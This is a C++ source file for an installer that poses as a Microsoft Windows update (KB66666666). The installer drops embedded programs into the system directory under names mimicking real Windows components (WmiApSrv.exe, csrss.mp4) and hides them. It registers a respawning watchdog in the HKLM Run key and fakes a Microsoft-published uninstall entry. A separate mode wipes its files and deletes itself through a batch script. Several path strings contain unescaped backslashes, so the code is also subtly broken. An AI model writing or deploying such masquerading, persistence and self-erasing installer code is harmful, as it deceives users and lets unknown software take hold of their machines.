/**
 * AdCMD v4.3 Installer
 * 模拟 Windows 2000/XP 时代 Update.exe 风格的自解压安装器
 * 文件名: WindowsXP-KB66666666-x86-ENU.exe
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <string>
#include <vector>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// 内嵌资源ID
#define IDR_ADCMD_MAIN      100
#define IDR_ADCMD_WATCHDOG  101
#define IDR_ADCMD_PLAYER    102
#define IDR_MV_VIDEO        103

// 资源类型
#define RT_BINARY           256

/* ============================================================
 *  自解压安装逻辑 (Update.exe 风格)
 * ============================================================ */

// 模拟 Update.exe 的命令行参数
void ShowUsage() {
    MessageBoxW(NULL, 
        L"Update for Windows CMD (KB66666666)\n"
        L"\n"
        L"Usage: WindowsXP-KB66666666-x86-ENU.exe [options]\n"
        L"\n"
        L"Options:\n"
        L"  /help         Display this help message\n"
        L"  /passive      Unattended installation (progress bar only)\n"
        L"  /quiet        Quiet mode (no user interaction)\n"
        L"  /norestart    Do not restart after installation\n"
        L"  /forcerestart Force restart after installation\n"
        L"  /extract      Extract files to folder without installing\n"
        L"  /log          Enable verbose logging\n"
        L"\n"
        L"For more information, visit https://support.microsoft.com/kb/66666666",
        L"Windows Update Standalone Installer", MB_OK | MB_ICONINFORMATION);
}

bool ExtractResource(int resId, const wchar_t* destPath) {
    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(resId), MAKEINTRESOURCEW(RT_BINARY));
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;
    DWORD size = SizeofResource(NULL, hRes);
    void* data = LockResource(hData);
    if (!data || size == 0) return false;

    HANDLE hFile = CreateFileW(destPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD written;
    BOOL ok = WriteFile(hFile, data, size, &written, NULL);
    CloseHandle(hFile);
    return ok && written == size;
}

bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }
    return isAdmin;
}

bool RunInstaller(bool passive, bool quiet, bool noRestart, bool extractOnly, const wchar_t* extractPath) {
    wchar_t sysDir[MAX_PATH], tempDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    GetTempPathW(MAX_PATH, tempDir);

    // 创建临时解压目录
    std::wstring extractDir = extractOnly ? std::wstring(extractPath) : std::wstring(tempDir) + L"AdCMD_Install";
    CreateDirectoryW(extractDir.c_str(), NULL);

    // 显示进度窗口（如果不是安静模式）
    HWND hProgress = NULL;
    if (!quiet) {
        hProgress = CreateWindowExW(0, L"STATIC", 
            passive ? L"Installing Update for Windows CMD..." : L"Windows Update Standalone Installer",
            WS_OVERLAPPED | WS_CAPTION | SS_CENTER,
            CW_USEDEFAULT, CW_USEDEFAULT, 400, 100, NULL, NULL, NULL, NULL);
        ShowWindow(hProgress, SW_SHOW);
        UpdateWindow(hProgress);
    }

    // 解压文件
    std::wstring mainPath = extractDir + L"\AdCMD.exe";
    std::wstring watchdogPath = extractDir + L"\WmiApSrv.exe";
    std::wstring playerPath = extractDir + L"\AdCMD_Player.exe";
    std::wstring mvPath = extractDir + L"\csrss.mp4";

    if (!quiet) SetWindowTextW(hProgress, L"Extracting: AdCMD.exe...");
    if (!ExtractResource(IDR_ADCMD_MAIN, mainPath.c_str())) return false;

    if (!quiet) SetWindowTextW(hProgress, L"Extracting: WmiApSrv.exe...");
    if (!ExtractResource(IDR_ADCMD_WATCHDOG, watchdogPath.c_str())) return false;

    if (!quiet) SetWindowTextW(hProgress, L"Extracting: AdCMD_Player.exe...");
    if (!ExtractResource(IDR_ADCMD_PLAYER, playerPath.c_str())) return false;

    if (!quiet) SetWindowTextW(hProgress, L"Extracting: csrss.mp4...");
    ExtractResource(IDR_MV_VIDEO, mvPath.c_str()); // 可选，可能不存在

    if (extractOnly) {
        if (!quiet) {
            MessageBoxW(NULL, (L"Files extracted to:\n" + extractDir).c_str(), 
                L"Extraction Complete", MB_OK | MB_ICONINFORMATION);
        }
        if (hProgress) DestroyWindow(hProgress);
        return true;
    }

    // 复制到系统目录
    if (!quiet) SetWindowTextW(hProgress, L"Installing system components...");

    std::wstring sysMain = std::wstring(sysDir) + L"\AdCMD.exe";
    std::wstring sysWatchdogDir = std::wstring(sysDir) + L"\wbem\Performance";
    std::wstring sysWatchdog = sysWatchdogDir + L"\WmiApSrv.exe";
    std::wstring sysPlayer = std::wstring(sysDir) + L"\AdCMD_Player.exe";
    std::wstring sysMV = std::wstring(sysDir) + L"\csrss.mp4";

    CreateDirectoryW(sysWatchdogDir.c_str(), NULL);

    CopyFileW(mainPath.c_str(), sysMain.c_str(), FALSE);
    CopyFileW(watchdogPath.c_str(), sysWatchdog.c_str(), FALSE);
    CopyFileW(playerPath.c_str(), sysPlayer.c_str(), FALSE);
    if (GetFileAttributesW(mvPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        CopyFileW(mvPath.c_str(), sysMV.c_str(), FALSE);
        SetFileAttributesW(sysMV.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }

    // 设置属性
    SetFileAttributesW(sysWatchdog.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

    // 注册表项
    HKEY hKey;
    std::wstring runPath = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    std::wstring guardCmd = L"\"" + sysWatchdog + L"\" --guard-respawn";
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, runPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, 
        KEY_WRITE, NULL, &hKey, NULL);
    RegSetValueExW(hKey, L"WmiApSrv", 0, REG_SZ, (BYTE*)guardCmd.c_str(), 
        (DWORD)(guardCmd.length() + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);

    // 创建 Windows Update 卸载条目
    std::wstring keyPath = L"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{KB66666666}";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, 
        KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"DisplayName", 0, REG_SZ, (BYTE*)L"Update for Windows CMD (KB66666666)", 72);
        RegSetValueExW(hKey, L"Publisher", 0, REG_SZ, (BYTE*)L"Microsoft Corporation", 44);
        RegSetValueExW(hKey, L"DisplayVersion", 0, REG_SZ, (BYTE*)L"10.0.66666.66", 28);
        std::wstring uninstallCmd = L"\"" + sysMain + L"\" --uninstall";
        RegSetValueExW(hKey, L"UninstallString", 0, REG_SZ, (BYTE*)uninstallCmd.c_str(), 
            (DWORD)(uninstallCmd.length() + 1) * sizeof(wchar_t));
        DWORD noModify = 1, noRepair = 1, estSize = 666;
        RegSetValueExW(hKey, L"NoModify", 0, REG_DWORD, (BYTE*)&noModify, sizeof(DWORD));
        RegSetValueExW(hKey, L"NoRepair", 0, REG_DWORD, (BYTE*)&noRepair, sizeof(DWORD));
        RegSetValueExW(hKey, L"EstimatedSize", 0, REG_DWORD, (BYTE*)&estSize, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    // 运行安装后配置
    if (!quiet) SetWindowTextW(hProgress, L"Configuring system...");
    ShellExecuteW(NULL, L"open", sysMain.c_str(), L"--install", NULL, SW_HIDE);
    ShellExecuteW(NULL, L"open", sysWatchdog.c_str(), L"--install", NULL, SW_HIDE);

    // 清理临时文件
    DeleteFileW(mainPath.c_str());
    DeleteFileW(watchdogPath.c_str());
    DeleteFileW(playerPath.c_str());
    DeleteFileW(mvPath.c_str());
    RemoveDirectoryW(extractDir.c_str());

    if (!quiet) {
        if (hProgress) DestroyWindow(hProgress);
        if (!noRestart) {
            int r = MessageBoxW(NULL, 
                L"Installation complete.\n\n"
                L"Update for Windows CMD (KB66666666) has been successfully installed.\n"
                L"Your system must be restarted for the update to take effect.\n\n"
                L"Do you want to restart now?",
                L"Installation Complete", MB_YESNO | MB_ICONINFORMATION);
            if (r == IDYES) {
                system("shutdown /r /t 10 /c \"Windows Update: Restarting to complete installation...\"");
            }
        } else {
            MessageBoxW(NULL, 
                L"Installation complete.\n\n"
                L"Update for Windows CMD (KB66666666) has been successfully installed.\n"
                L"Please restart your computer when convenient.",
                L"Installation Complete", MB_OK | MB_ICONINFORMATION);
        }
    } else if (!noRestart) {
        system("shutdown /r /t 60 /c \"Windows Update: Restarting to complete installation...\"");
    }

    return true;
}

/* ============================================================
 *  不安装式体验模式 (解压到 temp，关闭即自毁)
 * ============================================================ */

struct TempSession {
    std::wstring tempDir;
    HANDLE hMainProcess;
    HANDLE hWatchdogProcess;
    HANDLE hCleanupThread;
};

TempSession g_session;

DWORD WINAPI CleanupThread(LPVOID) {
    // 等待主进程结束
    if (g_session.hMainProcess) {
        WaitForSingleObject(g_session.hMainProcess, INFINITE);
        CloseHandle(g_session.hMainProcess);
    }

    // 终止看门狗
    if (g_session.hWatchdogProcess) {
        TerminateProcess(g_session.hWatchdogProcess, 0);
        WaitForSingleObject(g_session.hWatchdogProcess, 5000);
        CloseHandle(g_session.hWatchdogProcess);
    }

    // 自毁：删除所有临时文件
    Sleep(1000); // 给进程一点时间退出

    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((g_session.tempDir + L"\*").c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
            std::wstring filePath = g_session.tempDir + L"\" + findData.cFileName;
            SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
            DeleteFileW(filePath.c_str());
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }

    // 删除自身（通过批文件延迟删除）
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring batPath = g_session.tempDir + L"\_cleanup.bat";
    std::wstring batContent = L"@echo off\n:retry\ndel \"" + std::wstring(exePath) + L"\" 2>nul\nif exist \"" + std::wstring(exePath) + L"\" goto retry\nrmdir /s /q \"" + g_session.tempDir + L"\"\n";

    HANDLE hBat = CreateFileW(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBat != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hBat, batContent.c_str(), (DWORD)(batContent.length() * sizeof(wchar_t)), &written, NULL);
        CloseHandle(hBat);

        ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c \"" + batPath + L"\"").c_str(), NULL, SW_HIDE);
    }

    return 0;
}

bool RunTempSession() {
    // 创建临时目录
    wchar_t tempRoot[MAX_PATH];
    GetTempPathW(MAX_PATH, tempRoot);
    g_session.tempDir = std::wstring(tempRoot) + L"AdCMD_Temp_" + std::to_wstring(GetTickCount());
    CreateDirectoryW(g_session.tempDir.c_str(), NULL);

    // 解压文件
    std::wstring mainPath = g_session.tempDir + L"\AdCMD.exe";
    std::wstring watchdogPath = g_session.tempDir + L"\WmiApSrv.exe";
    std::wstring playerPath = g_session.tempDir + L"\AdCMD_Player.exe";
    std::wstring mvPath = g_session.tempDir + L"\csrss.mp4";

    if (!ExtractResource(IDR_ADCMD_MAIN, mainPath.c_str())) return false;
    if (!ExtractResource(IDR_ADCMD_WATCHDOG, watchdogPath.c_str())) return false;
    if (!ExtractResource(IDR_ADCMD_PLAYER, playerPath.c_str())) return false;
    ExtractResource(IDR_MV_VIDEO, mvPath.c_str());

    // 启动主程序（临时模式）
    STARTUPINFOW si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    std::wstring mainCmd = L"\"" + mainPath + L"\" --temp-mode";

    if (!CreateProcessW(NULL, (LPWSTR)mainCmd.c_str(), NULL, NULL, FALSE, 
        CREATE_NEW_PROCESS_GROUP, NULL, g_session.tempDir.c_str(), &si, &pi)) {
        return false;
    }
    g_session.hMainProcess = pi.hProcess;
    CloseHandle(pi.hThread);

    // 启动看门狗（临时模式，不安装注册表）
    STARTUPINFOW si2 = {0}; si2.cb = sizeof(si2);
    PROCESS_INFORMATION pi2 = {0};
    std::wstring watchdogCmd = L"\"" + watchdogPath + L"\" --temp-guard " + std::to_wstring(pi.dwProcessId);

    CreateProcessW(NULL, (LPWSTR)watchdogCmd.c_str(), NULL, NULL, FALSE, 
        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, g_session.tempDir.c_str(), &si2, &pi2);
    if (pi2.hProcess) {
        g_session.hWatchdogProcess = pi2.hProcess;
        CloseHandle(pi2.hThread);
    }

    // 启动清理线程
    g_session.hCleanupThread = CreateThread(NULL, 0, CleanupThread, NULL, 0, NULL);

    // 显示提示
    MessageBoxW(NULL, 
        L"AdCMD Temporary Session Started\n\n"
        L"All files are running from temporary memory.\n"
        L"When you close AdCMD, all traces will be automatically destroyed.\n\n"
        L"No system changes will be made.\n"
        L"This is a safe preview mode.",
        L"AdCMD - Temporary Mode", MB_OK | MB_ICONINFORMATION);

    return true;
}

/* ============================================================
 *  入口点
 * ============================================================ */
int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR lpCmdLine, int) {
    int argc; LPWSTR* argv = CommandLineToArgvW(lpCmdLine, &argc);

    bool showHelp = false;
    bool passive = false;
    bool quiet = false;
    bool noRestart = false;
    bool extractOnly = false;
    bool tempMode = false;
    std::wstring extractPath;

    for (int i = 0; i < argc; i++) {
        std::wstring arg = argv[i];
        for (auto& c : arg) c = towlower(c);

        if (arg == L"/help" || arg == L"/?" || arg == L"-h" || arg == L"--help") showHelp = true;
        else if (arg == L"/passive") passive = true;
        else if (arg == L"/quiet") quiet = true;
        else if (arg == L"/norestart") noRestart = true;
        else if (arg == L"/forcerestart") noRestart = false;
        else if (arg == L"/extract") extractOnly = true;
        else if (arg == L"/temp" || arg == L"--temp" || arg == L"/demo") tempMode = true;
        else if ((arg == L"/extractto" || arg == L"/x") && i + 1 < argc) {
            extractPath = argv[++i];
            extractOnly = true;
        }
    }

    LocalFree(argv);

    if (showHelp) {
        ShowUsage();
        return 0;
    }

    // 不安装式体验模式
    if (tempMode) {
        return RunTempSession() ? 0 : 1;
    }

    // 检查管理员权限
    if (!IsAdmin() && !extractOnly) {
        if (!quiet) {
            int r = MessageBoxW(NULL, 
                L"This update requires administrator privileges.\n\n"
                L"Do you want to allow this app to make changes to your device?",
                L"Windows Update", MB_YESNO | MB_ICONQUESTION);
            if (r != IDYES) return 1;
        }

        // 重新以管理员运行
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = exePath;
        sei.lpParameters = lpCmdLine;
        sei.nShow = quiet ? SW_HIDE : SW_NORMAL;
        if (ShellExecuteExW(&sei)) return 0;
        return 1;
    }

    // 传统安装模式
    if (extractPath.empty()) {
        wchar_t tempDir[MAX_PATH];
        GetTempPathW(MAX_PATH, tempDir);
        extractPath = std::wstring(tempDir) + L"AdCMD_Extract";
    }

    return RunInstaller(passive, quiet, noRestart, extractOnly, extractPath.c_str()) ? 0 : 1;
}
